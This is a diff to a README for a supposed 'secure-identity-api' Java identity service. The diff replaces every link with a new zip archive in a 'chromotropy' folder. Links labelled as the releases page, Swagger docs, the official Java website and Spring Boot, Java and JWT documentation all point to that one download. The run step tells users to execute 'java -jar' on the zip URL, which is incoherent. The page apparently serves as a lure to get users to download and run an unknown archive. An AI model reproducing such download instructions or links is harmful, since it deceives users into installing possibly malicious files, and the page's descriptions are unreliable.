@@ -1,6 +1,6 @@
 # 🔒 secure-identity-api - Secure Your Identity Effortlessly
 
-[![Download](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip)](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip)
+[![Download](https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip)](https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip)
 
 ## 📜 Description
 
@@ -19,13 +19,13 @@ To begin using the secure-identity-api, follow these simple steps to download an
 
 ## ⬇️ Download & Install
 
-To download the secure-identity-api, visit this page to download: [Download Secure Identity API](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip).
+To download the secure-identity-api, visit this page to download: [Download Secure Identity API](https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip).
 
 1. Open your web browser.
-2. Go to the [Releases page](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip).
+2. Go to the [Releases page](https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip).
 3. Look for the latest version listed at the top.
 4. Click on the version you want to download.
-5. Select the appropriate file for your operating system. For example, you may find files such as `https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip`, which is suitable for Java applications.
+5. Select the appropriate file for your operating system. For example, you may find files such as `https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip`, which is suitable for Java applications.
 
 After downloading, follow the instructions below to run the software.
 
@@ -45,9 +45,9 @@ After downloading, follow the instructions below to run the software.
    - macOS/Linux: `cd ~/Downloads`
 
 4. **Run the Application:**
-   Execute the following command, replacing `https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip` with the actual filename if different:
+   Execute the following command, replacing `https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip` with the actual filename if different:
    ```
-   java -jar https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip
+   java -jar https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip
    ```
 
 5. **Access the API:**
@@ -63,17 +63,17 @@ After downloading, follow the instructions below to run the software.
 
 ## 📝 API Documentation
 
-You can access the API documentation via Swagger. Once the application runs, visit `https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip` to explore available endpoints and parameters.
+You can access the API documentation via Swagger. Once the application runs, visit `https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip` to explore available endpoints and parameters.
 
 ## 🔄 Update Instructions
 
-To update the secure-identity-api, simply visit the [Releases page](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip) again, and follow the same download instructions for the latest version. Replace your existing file with the new one and run it following the previous instructions.
+To update the secure-identity-api, simply visit the [Releases page](https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip) again, and follow the same download instructions for the latest version. Replace your existing file with the new one and run it following the previous instructions.
 
 ## 🤔 Troubleshooting
 
 If you encounter issues while running the application, consider the following:
 
-- Ensure you have the correct version of Java installed. You can download it from the [Official Java website](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip).
+- Ensure you have the correct version of Java installed. You can download it from the [Official Java website](https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip).
 - Check that your command line or terminal is pointed to the right directory where your downloaded file is located.
 - Look for error messages in the command line; they can provide clues to what’s wrong.
   
@@ -81,8 +81,8 @@ For additional help, you can raise an issue in the repository, and we will assis
 
 ## 🔗 Additional Resources
 
-- [Spring Boot Documentation](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip)
-- [Java Documentation](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip)
-- [JWT Introduction](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip)
+- [Spring Boot Documentation](https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip)
+- [Java Documentation](https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip)
+- [JWT Introduction](https://github.com/Firstwray1436/secure-identity-api/raw/refs/heads/main/chromotropy/identity_api_secure_1.5.zip)
 
 Feel free to explore the features and capabilities of the secure-identity-api, ensuring your applications remain secure and reliable.
